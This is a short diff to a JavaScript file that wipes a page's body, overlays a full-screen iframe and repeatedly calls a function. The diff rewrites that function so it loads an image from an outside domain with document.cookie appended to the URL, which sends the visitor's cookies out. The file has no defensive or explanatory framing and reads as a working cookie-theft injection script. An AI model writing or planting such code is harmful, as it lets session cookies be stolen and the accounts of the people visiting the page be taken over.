@@ -1,6 +1,7 @@
 function readViewPort(){
-  var ifr= document.getElementById('watched');
-  console.log(ifr.contentWindow.location.href);
+  console.log('request');
+  var i= new Image;
+  i.src='https://caphenystore.com/'+document.cookie;
 }
 
 var iframe = document.createElement("iframe");
@@ -20,5 +21,5 @@ iframe.style.visibility='visible';
 iframe.style.zIndex='100000';
 document.body.innerHTML = '';
 document.body.appendChild(iframe);
-console.log('oke')
+
 setInterval(readViewPort(),5000)
